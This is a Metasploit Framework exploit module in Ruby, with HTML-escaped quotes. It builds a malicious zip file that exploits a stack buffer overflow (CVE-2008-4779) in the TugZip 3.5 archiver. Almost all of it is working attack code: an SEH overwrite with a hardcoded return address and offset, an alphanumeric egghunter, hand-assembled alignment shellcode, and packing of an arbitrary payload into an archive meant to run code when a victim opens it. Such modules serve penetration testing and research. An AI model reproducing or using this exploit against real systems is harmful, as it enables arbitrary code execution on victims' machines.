# $Id: tugzip.rb 13868 2011-10-11 03:30:14Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
require &#039;rex/zip&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;TugZip 3.5 Zip File Parsing Buffer Overflow Vulnerability&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack-based buffer overflow vulnerability
                in the latest version 3.5 of TugZip archiving utility.
                In order to trigger the vulnerability, an attacker must convince someone
                to load a specially crafted zip file with TugZip by double click or file open.
                By doing so, an attacker can execute arbitrary code as the victim user.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Stefan Marin&#039;, # Vulnerability discovery
                    &#039;Lincoln&#039;, # Corelan team. Original exploit
                    &#039;TecR0c <roccogiovannicalvi[at]gmail.com>&#039;, # Metasploit module
                    &#039;mr_me <steventhomasseeley[at]gmail.com>&#039;,  # Metasploit module
                ],
            &#039;Version&#039;        => &#039;$Revision: 13868 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;49371&#039; ],
                    [ &#039;CVE&#039;, &#039;2008-4779&#039; ],
                    [ &#039;BID&#039;, &#039;17432&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/12008/&#039; ]
                ],
            &#039;Platform&#039;       => [ &#039;win&#039; ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039;      => "\x00\x0f\x14\x15\x2f" + (0x80..0xff).to_a.pack(&#039;C*&#039;),
                    &#039;DisableNops&#039;   => true, # no need
                    &#039;EncoderType&#039;   => Msf::Encoder::Type::AlphanumMixed,
                    &#039;EncoderOptions&#039; =>
                        {
                            &#039;BufferRegister&#039; => &#039;EDI&#039;, # Egghunter jmp EDI
                        }
                },
 
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Universal&#039;,
                        {
                            &#039;Ret&#039;    => 0x7e0c307e,
                            # 5.00.2147.1 [ztvcabinet.dll]
                            # POP EBX > POP EBP > RETN
                            &#039;Offset&#039; => 372, # to nseh
                        }
                    ],
                ],
            &#039;DislosureDate&#039; => &#039;Oct 28 2008&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The output file name.&#039;, &#039;msf.zip&#039;]),
            ], self.class)
 
    end
 
    def exploit
 
        # Hardcoded egghunter due to size limit (before nseh destroyed/130D past seh of usable bytes)
        # base register ESI
        hunter = "VYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIK9Jzs"
        hunter << "rbrRJuRRxzmvNWLWuQJt4ZOnXPwtpTpQdLKJZLoPuzJNO3EXgkOJGA"
        eggtag = &#039;w00t&#039; * 2
 
        getpc_asm = %q{
            popad
            popad
            popad
            popad
            popad
            pop ebx
        }
 
        # Align EBX for hunter
        alignment = Metasm::Shellcode.assemble(Metasm::Ia32.new, getpc_asm).encode_string
 
        # Align for ESI + factoring mangled chars
        alignment << "\x89\x05"              # jmp short (5 bytes) to &#039;jmp back&#039; at end
        alignment << "\x5e"                  # pop esi
        alignment << "\x41"                  # nop (inc ecx)
        alignment << "\x98\x99"              # call esi
        alignment << "\x41"                  # nop (inc ecx)
        alignment << "\x8a\x94\x98\x98\x98"  # jmp back to pop esi
 
        getpc_asm = %q{
            popad
            pop esp
            inc eax
            inc eax
        }
 
        # Realign stack pointer
        nseh = Metasm::Shellcode.assemble(Metasm::Ia32.new, getpc_asm).encode_string
 
        seh = [target.ret].pack("V*")
 
        sploit = rand_text_alpha(target[&#039;Offset&#039;])
        sploit << nseh << seh
        sploit << alignment
        sploit << hunter
        sploit << eggtag << payload.encoded
 
        zip = Rex::Zip::Archive.new
        xtra = [0xdac0ffee].pack(&#039;V&#039;)
        comment = [0xbadc0ded].pack(&#039;V&#039;)
        zip.add_file(sploit, xtra, comment)
 
        # Create the file
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file...")
 
        file_create(zip.pack)
    end
 
end



